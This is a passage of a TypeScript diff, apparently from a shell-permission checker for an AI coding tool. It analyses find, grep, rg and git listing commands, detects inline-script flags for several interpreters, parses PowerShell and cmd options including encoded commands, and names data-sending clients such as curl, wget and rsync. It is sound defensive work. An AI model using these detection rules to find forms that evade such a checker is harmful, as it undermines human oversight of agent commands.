+const LS_FILES_LISTS = /^(-[zcomd]+|--(cached|others|modified|deleted|exclude-standard))$/;
+
+/**
+ * Whether a command only prints names it found under the folders it was given: `find` printing paths,
+ * `rg -l`, `rg --files`, `git ls-files`. Those folders are scanned as its own operands. No wrapper, no
+ * leading `find` option (`-L`, `-H`, `-P`, `-D`, `-O`), and nothing that follows a link or reads start
+ * points from a file. Returns the folders it lists from, `tracked` for git, which lists a tracked link as a name
+ * whatever it points to; null for any other command. `script` is the whole script, read for an rg config.
+ */
+function listsNames(raw: readonly string[], script: string): Listing | null {
+  if (raw.some(isDynamic) || isWrapper(raw[0] ?? '')) return null;
+  const [program, ...args] = raw.map(unquote);
+  const orHere = (folders: string[], links: Listing['links'], settings: ListedSettings, nul = false): Listing => ({
+    folders: folders.length > 0 ? folders : ['.'],
+    tracked: false,
+    links,
+    nul,
+    settings,
+  });
+  if (program === 'find') {
+    if (args[0]?.startsWith('-') && !/^-(name|iname|path|ipath|type|maxdepth|mindepth)$/.test(args[0])) return null;
+    if (args.some(arg => /^-(follow|files0-from)$/.test(arg))) return null;
+    // Only a `-print` that ends the expression prints what the tests before it select, and no more.
+    const actions = args.filter(arg => FIND_ACTION.test(arg));
+    const printing = actions.length === 0 || (actions.length === 1 && /^-print0?$/.test(args.at(-1) ?? ''));
+    if (!containedCommand(raw) || !printing) return null;
+    const end = args.findIndex(arg => /^[-(!]/.test(arg));
+    const tests = end === -1 ? [] : args.slice(end);
+    // An ANDed `-type f` or `-type d` prints no link, so there is nothing to look for.
+    const typed =
+      !tests.some(test => ['-o', '-or', ',', '(', ')', '!', '-not'].includes(test)) &&
+      tests.some((test, index) => test === '-type' && ['f', 'd'].includes(tests[index + 1] ?? ''));
+    const files = typed && tests.some((test, index) => test === '-type' && tests[index + 1] === 'f');
+    const listing = orHere(
+      end === -1 ? args : args.slice(0, end),
+      typed ? 'none' : 'find',
+      { kind: 'find', files },
+      args.at(-1) === '-print0'
+    );
+    return { ...listing, tests };
+  }
+  if (program === 'grep' || program === 'egrep' || program === 'fgrep') return grepLists(args);
+  if (program === 'rg') return rgLists(args, containedCommand(raw), script);
+  if (program === 'git' && args[0] === 'diff') return diffLists(raw.slice(2));
+  if (program === 'git' && args[0] === 'grep') return gitGrepLists(args.slice(1));
+  if (program === 'git' && args[0] === 'ls-files') {
+    const operands: string[] = [];
+    const pathspecs: string[] = [];
+    let globbed = false;
+    // `--others` prints untracked links too, which only a walk finds; otherwise git lists its index.
+    const others = args.some(arg => arg === '--others' || /^-[a-z]*o/.test(arg));
+    const flags = args.filter(arg => /^-[a-z]+$/.test(arg)).join('');
+    const changedOnly =
+      (/[md]/.test(flags) || args.includes('--modified') || args.includes('--deleted')) &&
+      !flags.includes('c') &&
+      !args.includes('--cached');
+    for (const arg of args.slice(1)) {
+      if (arg.startsWith('-')) {
+        if (!LS_FILES_LISTS.test(arg)) return null;
+        continue;
+      }
+      if (arg.startsWith(':')) return null;
+      pathspecs.push(arg);
+      if (/[*?[]/.test(arg)) {
+        // A pathspec glob matches anywhere below the folder it starts from.
+        if (arg.startsWith('/') || arg.split('/').includes('..')) return null;
+        globbed = true;
+        operands.push('.');
+      } else operands.push(arg);
+    }
+    const nul = /z/.test(flags);
+    if (others) return { ...orHere(operands, 'walk', { kind: 'tree' }, nul), gitPathspecs: pathspecs };
+    const listing = orHere(operands, 'index', { kind: 'index', changedOnly, patterns: null }, nul);
+    return { ...listing, tracked: true, gitPathspecs: pathspecs, ...(globbed ? { pathspecs } : {}) };
+  }
+  return null;
+}
+
+/** Whether a grep pattern is plain text, which a file holds only if it holds that text. */
+const PLAIN_PATTERN = /^[^\\.[\]*^$+?(){}|]*$/;
+
+/** Literal patterns a file must hold one of to be printed; null when any file may be. */
+function patternsOf(texts: readonly (string | undefined)[], fixed: boolean, ignoreCase: boolean): Patterns | null {
+  if (texts.length === 0 || texts.some(text => text === undefined)) return null;
+  const lines = texts.flatMap(text => (text as string).split('\n'));
+  if (!fixed && lines.some(line => !PLAIN_PATTERN.test(line))) return null;
+  return { texts: ignoreCase ? lines.map(line => line.toLowerCase()) : lines, ignoreCase };
+}
+
+/**
+ * `rg -l` or `rg --files`, which neither follow nor print a link they meet while walking, as without -L. Any file
+ * may be printed, hidden or ignored ones too (a glob or an ignore file can bring them in). Null when a config file
+ * may add options: RIPGREP_CONFIG_PATH is set here or named in `script`, and `--no-config` is not given.
+ */
+function rgLists(args: readonly string[], contained: boolean, script: string): Listing | null {
+  if (
+    !args.includes('--no-config') &&
+    (process.env.RIPGREP_CONFIG_PATH !== undefined || /RIPGREP_CONFIG_PATH/.test(script))
+  ) {
+    return null;
+  }
+  const operands: string[] = [];
+  const patterns: string[] = [];
+  let clusters = '';
+  for (let index = 0; index < args.length; index++) {
+    const arg = args[index] as string;
+    if (arg === '-e' || arg === '--regexp') patterns.push(args[index + 1] ?? '');
+    if (arg.startsWith('--regexp=')) patterns.push(arg.slice('--regexp='.length));
+    if (RG_LIST_VALUES.test(arg)) index++;
+    else if (arg.startsWith('-') && !RG_LISTS.test(arg) && !/^--(regexp|glob|type|type-not)=/.test(arg)) return null;
+    else if (!arg.startsWith('-')) operands.push(arg);
+    else if (!arg.startsWith('--')) clusters += arg.slice(1);
+  }
+  const lists = clusters.includes('l') || args.includes('--files-with-matches') || args.includes('--files');
+  if (!lists || !contained) return null;
+  const files = args.includes('--files');
+  const explicit = patterns.length > 0;
+  if (!files && !explicit) patterns.push(operands.shift() ?? '');
+  const fixed = clusters.includes('F') || args.includes('--fixed-strings');
+  const ignoreCase = /[i]/.test(clusters) || args.includes('--ignore-case') || args.includes('--smart-case');
+  return {
+    folders: operands.length > 0 ? operands : ['.'],
+    tracked: false,
+    links: 'none',
+    nul: clusters.includes('0') || args.includes('--null'),
+    settings: {
+      kind: 'walked',
+      patterns: files ? null : patternsOf(patterns, fixed, ignoreCase),
+      include: [],
+      exclude: [],
+      excludeDir: [],
+    },
+  };
+}
+
+/** `grep -r` with `-l` or `-L`, which prints file names and skips the links it meets below its operands. */
+function grepLists(args: readonly string[]): Listing | null {
+  let recursive = false;
+  let lists = false;
+  let without = false;
+  let fixed = false;
+  let ignoreCase = false;
+  let nul = false;
+  const patterns: string[] = [];
+  const include: string[] = [];
+  const exclude: string[] = [];
+  const excludeDir: string[] = [];
+  const operands: string[] = [];
+  for (let index = 0; index < args.length; index++) {
+    const arg = args[index] as string;
+    const [, name, value] = /^--(regexp|include|exclude|exclude-dir)=(.*)$/s.exec(arg) ?? [];
+    if (arg === '-e' || arg === '--regexp') {
+      patterns.push(args[++index] ?? '');
+    } else if (name !== undefined && value !== undefined) {
+      if (name === 'regexp') patterns.push(value);
+      else (name === 'include' ? include : name === 'exclude' ? exclude : excludeDir).push(value);
+    } else if (/^--(recursive|files-with-matches|files-without-match)$/.test(arg)) {
+      recursive ||= arg === '--recursive';
+      lists ||= arg !== '--recursive';
+      without ||= arg === '--files-without-match';
+    } else if (/^--(ignore-case|word-regexp|fixed-strings|extended-regexp|null|no-messages)$/.test(arg)) {
+      ignoreCase ||= arg === '--ignore-case';
+      fixed ||= arg === '--fixed-strings';
+      nul ||= arg === '--null';
+    } else if (/^-[rilLwFEsIZ]+$/.test(arg)) {
+      recursive ||= arg.includes('r');
+      lists ||= /[lL]/.test(arg);
+      without ||= arg.includes('L');
+      ignoreCase ||= arg.includes('i');
+      fixed ||= arg.includes('F');
+      nul ||= arg.includes('Z');
+    } else if (arg.startsWith('-')) return null;
+    else operands.push(arg);
+  }
+  if (!recursive || !lists) return null;
+  if (patterns.length === 0) patterns.push(operands.shift() ?? '');
+  return {
+    folders: operands.length > 0 ? operands : ['.'],
+    tracked: false,
+    links: 'none',
+    nul,
+    settings: {
+      kind: 'walked',
+      patterns: without ? null : patternsOf(patterns, fixed, ignoreCase),
+      include,
+      exclude,
+      excludeDir,
+    },
+  };
+}
+
+/**
+ * Whether bash may turn a word as written into other words: an unquoted glob, a brace expansion, or a tilde at its
+ * start or after an unquoted `=` or `:`.
+ */
+function shellExpands(raw: string): boolean {
+  const pieces = wordPieces(raw);
+  const live = pieces.some(piece => !('char' in piece) || (piece.active && '*?['.includes(piece.char)));
+  if (live || expandsTilde(pieces)) return true;
+  // A sequence such as `{1..1}` makes one word, but not the word as written.
+  const words = expandBraces(pieces);
+  return words?.length !== 1 || textOf(words[0] as WordPiece[]) !== textOf(pieces);
+}
+
+const expandsTilde = (pieces: readonly WordPiece[]): boolean =>
+  pieces.some(
+    (piece, at) => isActive(piece, '~') && (at === 0 || isActive(pieces[at - 1], '=') || isActive(pieces[at - 1], ':'))
+  );
+
+const textOf = (pieces: readonly WordPiece[]): string =>
+  pieces.map(piece => ('char' in piece ? piece.char : '')).join('');
+
+/**
+ * The values bash passes git for one word after `git diff --`, braces expanded: fixed text, or with `glob` a
+ * pattern of literals and unquoted `*`s that does not start with `:`. Null when the scan cannot tell.
+ */
+function pathspecValues(raw: string): { text: string; glob: boolean }[] | null {
+  const pieces = wordPieces(raw);
+  if (pieces.some(piece => !('char' in piece))) return null;
+  const words = expandBraces(pieces);
+  if (words === null) return null;
+  const values: { text: string; glob: boolean }[] = [];
+  for (const word of words) {
+    // `?`, `[` and extglob's `(` match by rules git's pathspecs do not share.
+    if (expandsTilde(word) || word.some(piece => ['?', '[', '('].some(char => isActive(piece, char)))) return null;
+    const text = textOf(word);
+    const stars = word.filter(piece => isActive(piece, '*')).length;
+    if (stars === 0) {
+      values.push({ text, glob: false });
+      continue;
+    }
+    // A leading `:` would be read as magic, a `.*` component may match `..` in a bash without globskipdots, and an
+    // empty component is not walked here.
+    const components = text.split('/');
+    const plain =
+      !/[?[\]\\]/.test(text) &&
+      !text.startsWith(':') &&
+      !components.some(component => component === '' || (component.startsWith('.') && component.includes('*')));
+    if (!plain || stars !== [...text].filter(char => char === '*').length) return null;
+    values.push({ text, glob: true });
+  }
+  return values;
+}
+
+/** Folded one code point at a time, so the fold of joined text is the join of the folds. */
+const foldCase = (text: string): string => Array.from(text, char => char.toUpperCase().toLowerCase()).join('');
+
+/**
+ * Whether `name` is the literals `parts` with any text, newlines included, between each pair: the split of a
+ * pattern whose `*` runs are collapsed. Linear in the name, with each middle part taken at its first fit.
+ */
+function starMatches(parts: readonly string[], name: string): boolean {
+  const first = parts[0] ?? '';
+  const last = parts.at(-1) ?? '';
+  if (parts.length < 2) return name === first;
+  if (name.length < first.length + last.length || !name.startsWith(first) || !name.endsWith(last)) return false;
+  const end = name.length - last.length;
+  let at = first.length;
+  for (let index = 1; index < parts.length - 1; index++) {
+    const part = parts[index] as string;
+    const found = name.indexOf(part, at);
+    if (found < 0 || found + part.length > end) return false;
+    at = found + part.length;
+  }
+  return true;
+}
+
+/**
+ * The names bash may expand a pattern of literals and `*`s to under `cwd`, as it passes them, matched ignoring
+ * leading dots so dotglob is covered, and ignoring case as well as exactly. Null for a folder that cannot be read, a
+ * name that is not UTF-8 (or not NFC on macOS, where git may precompose it), or past WALK_ENTRIES or GLOB_MATCHES.
+ */
+export async function globNames(cwd: string, pattern: string, stopped: () => boolean): Promise<string[] | null> {
+  let found: { path: string; name: string }[] = [{ path: cwd, name: '' }];
+  let entries = 0;
+  const join = (name: string, child: string): string => (name === '' ? child : `${name}/${child}`);
+  for (const component of pattern.split('/')) {
+    if (!component.includes('*')) {
+      found = found.map(({ path, name }) => ({ path: `${path}/${component}`, name: join(name, component) }));
+      continue;
+    }
+    const parts = component.replace(/\*+/g, '*').split('*');
+    const folded = parts.map(foldCase);
+    const next: typeof found = [];
+    for (const { path, name } of found) {
+      if (stopped()) return null;
+      // Joined as written, so `..` after a link leads where bash's does.
+      const listed = await readdir(path, { encoding: 'buffer' }).catch((error: unknown) =>
+        missing(error) ? [] : null
+      );
+      if (listed === null) return null;
+      entries += listed.length;
+      if (entries > WALK_ENTRIES) return null;
+      for (const raw of listed) {
+        const child = raw.toString('utf8');
+        // A name that does not survive decoding is one the walk could neither follow nor check.
+        if (!Buffer.from(child, 'utf8').equals(raw)) return null;
+        if (process.platform === 'darwin' && child.normalize('NFC') !== child) return null;
+        if (starMatches(parts, child) || starMatches(folded, foldCase(child))) {
+          next.push({ path: `${path}/${child}`, name: join(name, child) });
+        }
+      }
+      if (next.length > GLOB_MATCHES) return null;
+    }
+    found = next;
+  }
+  return found.map(({ name }) => name);
+}
+
+/**
+ * `git diff --name-only [--cached|--staged] [rev [rev]] [-- pathspec...]`, which prints the paths that differ from
+ * the top of the work tree; each `A..B` reads as its two ends. `raw` holds its words as written, read here as the
+ * values bash passes to git.
+ */
+function diffLists(raw: readonly string[]): Listing | null {
+  const args: string[] = [];
+  const pathspecs: string[] = [];
+  const written: string[] = [];
+  const globs: string[] = [];
+  let paths = false;
+  for (const word of raw) {
+    if (!paths) {
+      // The words bash expands one into may be options, revisions or pathspec magic.
+      if (shellExpands(word)) return null;
+      const arg = textOf(wordPieces(word));
+      if (arg === '--') paths = true;
+      else args.push(arg);
+      continue;
+    }
+    const values = pathspecValues(word);
+    if (values === null) return null;
+    for (const { text, glob } of values) {
+      written.push(text);
+      if (!glob) {
+        pathspecs.push(text);
+        continue;
+      }
+      // Without nullglob, globstar or nocaseglob, bash passes the pattern as written or names it matches, each of which
+      // git's `*` (crossing `/`) matches; `/*` adds a matched folder's contents, and listingChecked adds glob-like names.
+      globs.push(text);
+      pathspecs.push(`:(icase)${text}`, `:(icase)${text}/*`);
+    }
+  }
+  let names = false;
+  let cached = false;
+  const revisions: string[] = [];
+  for (const arg of args) {
+    if (arg === '--name-only') names = true;
+    else if (arg === '--cached' || arg === '--staged') cached = true;
+    // A bare `--relative` prints names from the folder git runs in, which the listing check requires be the top.
+    else if (/^(-z|--no-renames|--relative|--diff-filter=[A-Za-z]*)$/.test(arg)) continue;
+    else if (arg.startsWith('-')) return null;
+    else revisions.push(arg);
+  }
+  if (!names) return null;
+  return {
+    folders: ['.'],
+    tracked: true,
+    links: 'diff',
+    nul: args.includes('-z'),
+    pathspecs,
+    gitPathspecs: written,
+    globs,
+    // diffTargets reads the words as revisions or paths, as git does.
+    settings: { kind: 'diff', words: revisions, cached },
+  };
+}
+
+/** `git grep -l` or `-L` over the index, which prints tracked paths from the folder it runs in. */
+function gitGrepLists(args: readonly string[]): Listing | null {
+  let lists = false;
+  let without = false;
+  let cached = false;
+  let untracked = false;
+  let fixed = false;
+  let ignoreCase = false;
+  let paths = false;
+  const patterns: string[] = [];
+  const operands: string[] = [];
+  for (let index = 0; index < args.length; index++) {
+    const arg = args[index] as string;
+    if (paths) operands.push(arg);
+    else if (arg === '--') paths = true;
+    else if (arg === '-e') patterns.push(args[++index] ?? '');
+    else if (/^(-l|--files-with-matches|--name-only)$/.test(arg)) lists = true;
+    else if (/^(-L|--files-without-match)$/.test(arg)) lists = without = true;
+    else if (arg === '--cached') cached = true;
+    else if (arg === '--untracked' || arg === '--no-index') untracked = true;
+    else if (/^--(ignore-case|word-regexp|fixed-strings|extended-regexp|basic-regexp)$/.test(arg)) {
+      ignoreCase ||= arg === '--ignore-case';
+      fixed ||= arg === '--fixed-strings';
+    } else if (/^-[ilLwFEG]+$/.test(arg)) {
+      lists ||= /[lL]/.test(arg);
+      without ||= arg.includes('L');
+      ignoreCase ||= arg.includes('i');
+      fixed ||= arg.includes('F');
+    } else if (arg.startsWith('-')) return null;
+    else operands.push(arg);
+  }
+  if (patterns.length === 0) patterns.push(operands.shift() ?? '');
+  if (!lists || operands.some(operand => operand.startsWith(':'))) return null;
+  const folders = operands.length > 0 ? operands : ['.'];
+  if (untracked) {
+    return { folders, tracked: false, links: 'walk', nul: false, gitPathspecs: operands, settings: { kind: 'tree' } };
+  }
+  const globbed = operands.some(operand => /[*?[]/.test(operand));
+  if (globbed && operands.some(operand => operand.startsWith('/') || operand.split('/').includes('..'))) return null;
+  return {
+    folders: globbed ? ['.'] : folders,
+    tracked: true,
+    links: 'index',
+    nul: false,
+    gitPathspecs: operands,
+    ...(globbed ? { pathspecs: operands } : {}),
+    settings: {
+      kind: 'index',
+      changedOnly: false,
+      patterns: cached || without ? null : patternsOf(patterns, fixed, ignoreCase),
+    },
+  };
+}
+
+/** The settings files in one `.claude` folder; null when it cannot be read. */
+async function settingsIn(folder: string): Promise<string[] | null> {
+  const names = await readdir(folder).catch((error: NodeJS.ErrnoException) =>
+    missing(error) || error.code === 'ENOTDIR' ? [] : null
+  );
+  return names?.filter(name => /^settings/i.test(name)).map(name => under(folder, name)) ?? null;
+}
+
+/**
+ * The settings files a walk from `place` meets that a session reads: in the `.claude` folder at the top of `place`
+ * or of a settings base inside it, or in the `.claude` folder `place` lies in. Null when one cannot be read.
+ */
+async function settingsUnder(place: string, bases: readonly string[]): Promise<string[] | null> {
+  const found: string[] = [];
+  for (const base of [place, ...bases.filter(base => isWithin(place, base))]) {
+    const files = await settingsIn(under(base, '.claude'));
+    if (files === null) return null;
+    found.push(...files);
+  }
+  const parts = place.split('/');
+  const settings = parts.findIndex(part => part.toLowerCase() === '.claude');
+  if (settings !== -1) {
+    const files = await settingsIn(parts.slice(0, settings + 1).join('/') || '/');
+    if (files === null) return null;
+    found.push(...files.filter(file => isWithin(place, file)));
+  }
+  return [...new Set(found)];
+}
+
+/** Whether grep's `--include`, `--exclude` and `--exclude-dir` skip a file at `below` (its path from the walk's start). */
+function grepSkips(settings: Extract<ListedSettings, { kind: 'walked' }>, below: readonly string[]): boolean {
+  const pattern = (glob: string): GlobChar[] =>
+    [...glob].map(char => ({ char, glob: '*?['.includes(char), active: true }));
+  const name = below[below.length - 1] ?? '';
+  const folders = below.slice(0, -1);
+  // An include matches more and an exclude less than grep may, so a file is only skipped when grep surely skips it.
+  // With both given, GNU grep lets the last that matches decide, so neither skips; folders are judged apart.
+  const one = settings.include.length === 0 || settings.exclude.length === 0;
+  if (one && settings.include.length > 0 && !settings.include.some(glob => globMatches(pattern(glob), name, true)))
+    return true;
+  if (one && settings.exclude.some(glob => globMatches(pattern(glob), name, false))) return true;
+  return settings.excludeDir.some(glob => folders.some(folder => globMatches(pattern(glob), folder, false)));
+}
+
+/** Bytes of a settings file read for `mayHold`; a larger one may hold anything. */
+const PATTERN_READ_BYTES = 1024 * 1024;
+
+/**
+ * Whether the file at `path` may hold one of `patterns`; any file may when there are none to read, when it is not a
+ * regular file once opened (a FIFO does not block the open), and, ignoring case, when a byte is outside ASCII, as
+ * Unicode folds some letters onto ASCII ones (U+017F onto `s`).
+ */
+async function mayHold(path: string, patterns: Patterns | null): Promise<boolean> {
+  if (patterns === null) return true;
+  const handle = await open(path, fsConstants.O_RDONLY | fsConstants.O_NONBLOCK).catch(() => null);
+  if (handle === null) return true;
+  try {
+    const info = await handle.stat();
+    if (!info.isFile() || info.size > PATTERN_READ_BYTES) return true;
+    const content = await handle.readFile();
+    const ascii = (bytes: Buffer): boolean => bytes.every(byte => byte <= 0x7f);
+    if (patterns.ignoreCase && !(patterns.texts.every(text => ascii(Buffer.from(text))) && ascii(content))) return true;
+    const text = patterns.ignoreCase ? content.toString('utf8').toLowerCase() : content.toString('utf8');
+    return patterns.texts.some(pattern => text.includes(pattern));
+  } catch {
+    return true;
+  } finally {
+    await handle.close().catch(() => undefined);
+  }
+}
+
+/** Literal texts a printed file holds at least one of, folded when `ignoreCase`. */
+interface Patterns {
+  texts: string[];
+  ignoreCase: boolean;
+}
+
+/**
+ * Which settings files (`.claude/settings*`) a lister may print, which a program writing what it lists rewrites.
+ * `walked`: those in a `.claude` folder at the top of a folder it walks, or that it starts in, less those grep's
+ * file filters skip and those holding none of `patterns`. `find` asks the system find, and for a find that may print
+ * folders (not `files` only) the folders holding settings too; `index` and `diff` read git, and `tree` rewrites each
+ * folder whole.
+ */
+type ListedSettings =
+  | {
+      kind: 'walked';
+      patterns: Patterns | null;
+      include: string[];
+      exclude: string[];
+      excludeDir: string[];
+    }
+  | { kind: 'find'; files: boolean }
+  | { kind: 'index'; changedOnly: boolean; patterns: Patterns | null }
+  | { kind: 'diff'; words: string[]; cached: boolean }
+  | { kind: 'tree' };
+
+/**
+ * The folders a lister walks; `tracked` when what it lists is git's index, links included. `links` says how links
+ * it may print are found: a walk here, the system find with the lister's own `tests`, git's index, git's diff, or
+ * none at all. `pathspecs` are git's own, when a glob among them makes the folders only where they start. `nul`
+ * when it ends each name with a NUL byte.
+ */
+interface Listing {
+  folders: string[];
+  tracked: boolean;
+  links: 'walk' | 'find' | 'index' | 'diff' | 'none';
+  nul: boolean;
+  tests?: string[];
+  pathspecs?: string[];
+  /** For a git lister, the pathspecs it reads as written, which git's pathspec settings may read otherwise. */
+  gitPathspecs?: string[];
+  /** Patterns bash expands from where the lister runs, whose matched names the listing check reads too. */
+  globs?: string[];
+  settings: ListedSettings;
+}
 
 /** A wrapper can change the executable, and these clients can start sending data just by changing flags. */
 export function requiresExactShellRule(command: string): boolean {
   const head = /^(?:"([^"]*)"|'([^']*)'|(\S+))(?:\s+|$)/.exec(command);
   if (!head) return true;
   const executable = head[1] ?? head[2] ?? head[3];
-  const program = basename(executable);
+  const name = programName(executable);
   const argumentsText = command.slice(head[0].length);
   return (
     // Quoting or an absolute executable defeats arityPrefix's bare-program lookup.
-    head[1] !== undefined || head[2] !== undefined || executable !== program ||
-    WRAPPERS.has(program) ||
-    /^(curl|wget|rsync|aws|gsutil|gcloud|docker|podman)$/.test(program) ||
-    (program === 'gh' && (
-      /^(?:api|"api"|'api')(?:\s|$)/.test(argumentsText) ||
-      !/^[A-Za-z]+\s+[A-Za-z]+(?:\s|$)/.test(argumentsText)
-    ))
+    head[1] !== undefined ||
+    head[2] !== undefined ||
+    executable !== basename(executable) ||
+    WRAPPERS.has(name) ||
+    /^(curl|wget|rsync|aws|gsutil|gcloud|docker|podman)$/.test(name) ||
+    (name === 'gh' &&
+      (/^(?:api|"api"|'api')(?:\s|$)/.test(argumentsText) || !/^[A-Za-z]+\s+[A-Za-z]+(?:\s|$)/.test(argumentsText)))
   );
 }
 
@@ -195,66 +4611,200 @@ const WGET_SENDS = /^--(post|body)/;
 const DASH_C = /^-[a-zA-Z]*c/;
 // Shells read `+c` like `-c` (`bash +ec '...'` runs the script); python reads `+c` as a file name.
 const SHELL_C = /^[+-][a-zA-Z]*c/;
-const INLINE_SCRIPT: Record<string, RegExp> = {
-  node: /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/,
-  ruby: /^-[a-zA-Z]*e/,
-  perl: /^-[a-zA-Z]*[eE]/,
-  php: /^-r/,
-  bun: /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/,
-  osascript: /^-e/,
-  sh: SHELL_C,
-  bash: SHELL_C,
-  zsh: SHELL_C,
-  dash: SHELL_C,
-};
+const INLINE_SCRIPT = new Map<string, RegExp>([
+  ['node', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
+  ['ruby', /^-[a-zA-Z]*e/],
+  ['perl', /^-[a-zA-Z]*[eE]/],
+  ['php', /^-r/],
+  ['bun', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
+  ['osascript', /^-e/],
+  ['sh', SHELL_C],
+  ['bash', SHELL_C],
+  ['zsh', SHELL_C],
+  ['dash', SHELL_C],
+]);
+
+/** The option that makes interpreter `name` run a script given inline, as `-c` for python. */
+const inlineScriptOption = (name: string): RegExp | undefined =>
+  /^python[\d.]*$/.test(name) ? DASH_C : INLINE_SCRIPT.get(name);
+
+/** A command line a Windows shell runs. */
+interface WindowsRun {
+  /** How many of its arguments the opaque form names: through `-Command`, or up to the command text. */
+  words: number;
+  /** What it runs, for the outbound reason. */
+  shown: string;
+  /** Whether it reads that command line from stdin. */
+  stdin: boolean;
+}
+
+const READS_STDIN: WindowsRun = { words: 0, shown: 'reading a script from stdin', stdin: true };
+
+/** cmd's `/c`, `/k` or `/r` (`//c` as Git Bash needs it); without one, cmd runs what it reads from stdin. */
+function cmdRun(args: readonly string[]): WindowsRun | null {
+  const at = args.findIndex(arg => /^\/(.*\/)?[ckr]/i.test(arg));
+  if (at !== -1) return { words: at + 1, shown: args[at], stdin: false };
+  return args.some(arg => /^\/(.*\/)?\?/.test(arg)) ? null : READS_STDIN;
+}
+
+type PowershellParameter = 'command' | 'file' | 'value' | 'flag' | 'help';
+
+/**
+ * PowerShell's parameters as [name, shortest prefix it accepts, meaning to Windows PowerShell 5.1, to
+ * PowerShell 7], null where that version has no such parameter. The first match wins, as in PowerShell.
+ */
+const POWERSHELL_PARAMETERS: readonly (readonly [
+  string,
+  string,
+  PowershellParameter | null,
+  PowershellParameter | null,
+])[] = [
+  ['?', '?', 'help', 'help'],
+  ['help', 'h', 'help', 'help'],
+  ['login', 'l', null, 'flag'],
+  ['version', 'v', null, 'flag'],
+  ['noexit', 'noe', 'flag', 'flag'],
+  ['noprofile', 'nop', 'flag', 'flag'],
+  ['nologo', 'nol', 'flag', 'flag'],
+  ['noninteractive', 'noni', 'flag', 'flag'],
+  ['noprofileloadtime', 'noprofileloadtime', null, 'flag'],
+  ['socketservermode', 'so', 'flag', 'flag'],
+  ['servermode', 's', 'flag', 'flag'],
+  ['namedpipeservermode', 'nam', 'flag', 'flag'],
+  ['sshservermode', 'sshs', null, 'flag'],
+  ['interactive', 'i', null, 'flag'],
+  ['configurationname', 'config', 'value', 'value'],
+  ['configurationfile', 'configurationfile', null, 'value'],
+  ['custompipename', 'cus', null, 'value'],
+  ['command', 'c', 'command', 'command'],
+  ['commandwithargs', 'commandwithargs', null, 'command'],
+  ['cwa', 'cwa', null, 'command'],
+  ['windowstyle', 'w', 'value', 'value'],
+  ['workingdirectory', 'wo', null, 'value'],
+  ['wd', 'wd', null, 'value'],
+  ['file', 'f', 'file', 'file'],
+  ['executionpolicy', 'ex', 'value', 'value'],
+  ['ep', 'ep', 'value', 'value'],
+  ['encodedcommand', 'e', 'command', 'command'],
+  ['ec', 'ec', 'command', 'command'],
+  ['encodedarguments', 'encodeda', 'value', 'value'],
+  ['ea', 'ea', 'value', 'value'],
+  ['settingsfile', 'settings', null, 'value'],
+  ['sta', 'st', 'flag', 'flag'],
+  ['mta', 'mta', 'flag', 'flag'],
+  ['inputformat', 'i', 'value', 'value'],
+  ['if', 'if', 'value', 'value'],
+  ['outputformat', 'o', 'value', 'value'],
+  ['of', 'of', 'value', 'value'],
+];
+
+/** String.Trim as .NET reads it: JS trim() plus U+0085. A loop, as a two-sided regex is quadratic on a long run of spaces. */
+function trimDotNet(text: string): string {
+  const isSpace = (char: string) => char === '\u0085' || char.trim() === '';
+  let start = 0;
+  let end = text.length;
+  while (start < end && isSpace(text[start])) start += 1;
+  while (end > start && isSpace(text[end - 1])) end -= 1;
+  return text.slice(start, end);
+}
+
+/** The name a PowerShell switch gives after its dash (two for PowerShell 7) or slash, lowercased; undefined for other words. */
+function powershellSwitch(arg: string, seven: boolean): string | undefined {
+  const leader = seven ? /^(?:[-\u{2013}-\u{2015}]{1,2}|\/)/u : /^[-\u{2013}-\u{2015}/]/u;
+  // .NET's String.Trim also removes U+0085, which JS trim() keeps.
+  const trimmed = trimDotNet(arg);
+  const match = leader.exec(trimmed);
+  return match ? trimmed.slice(match[0].length).toLowerCase() : undefined;
+}
+
+function powershellParameter(name: string, seven: boolean): PowershellParameter | undefined {
+  for (const [full, shortest, older, newer] of POWERSHELL_PARAMETERS) {
+    const meaning = seven ? newer : older;
+    if (meaning && name.length >= shortest.length && full.startsWith(name)) return meaning;
+  }
+  return undefined;
+}
+
+/**
+ * Whether `arg` is a parameter that starts a command. A value parameter takes the next word whatever
+ * it is, but one that would run a command is not skipped, so `-wd -c` still reads the command.
+ */
+function isCommandParameter(arg: string, seven: boolean): boolean {
+  const name = powershellSwitch(arg, seven);
+  return name !== undefined && powershellParameter(name, seven) === 'command';
+}
+
+/** What PowerShell (`seven` for pwsh) runs given `args`; null when it runs a script file or only prints help. */
+function powershellRun(args: readonly string[], seven: boolean): WindowsRun | null {
+  for (let at = 0; at < args.length; at++) {
+    const name = powershellSwitch(args[at], seven);
+    if (name === '') return READS_STDIN;
+    const meaning = name === undefined ? undefined : powershellParameter(name, seven);
+    if (meaning === 'command') return { words: at + 1, shown: args[at], stdin: false };
+    if (meaning === 'help') return null;
+    if (meaning === 'file') return args[at + 1] === '-' ? READS_STDIN : null;
+    if (meaning === 'value' && args[at + 1] !== undefined && !isCommandParameter(args[at + 1], seven)) at++;
+    if (meaning !== undefined) continue;
+    // 5.1 runs the first word it does not know, and every word after it, as a command; 7 runs it as a script.
+    return seven ? null : { words: at, shown: 'running its arguments as a command', stdin: false };
+  }
+  return READS_STDIN;
+}
+
+/** Windows shells, named as the scan looks them up, and what each runs given its arguments. */
+const WINDOWS_SHELLS = new Map<string, (args: readonly string[]) => WindowsRun | null>([
+  ['cmd', cmdRun],
+  ['powershell', args => powershellRun(args, false)],
+  ['pwsh', args => powershellRun(args, true)],
+]);
 
 /**
  * The option letters whose value is glued to the flag, so a letter after one is that value rather
  * than another flag: `ruby -rset` loads the library `set`, it does not run `-e`. Only list letters
  * the interpreter documents as taking a value.
  */
-const OPTION_VALUE_LETTERS: Record<string, string> = {
-  python: 'WX',
-  node: 'rC',
-  bun: 'rld',
-  perl: 'IMmx',
-  ruby: 'rICEKFx',
-  osascript: 'ls',
-  zsh: 'oO',
-};
+const OPTION_VALUE_LETTERS = new Map([
+  ['python', 'WX'],
+  ['node', 'rC'],
+  ['bun', 'rld'],
+  ['perl', 'IMmx'],
+  ['ruby', 'rICEKFx'],
+  ['osascript', 'ls'],
+  ['zsh', 'oO'],
+]);
 
 /**
  * Value letters that take only a glued value (`ruby -xdir`): even at the end of a cluster they do
  * not swallow the next word, so a script's own `-e` after `ruby -x script.rb` is not ruby's option.
  */
-const GLUED_ONLY_LETTERS: Record<string, string> = {
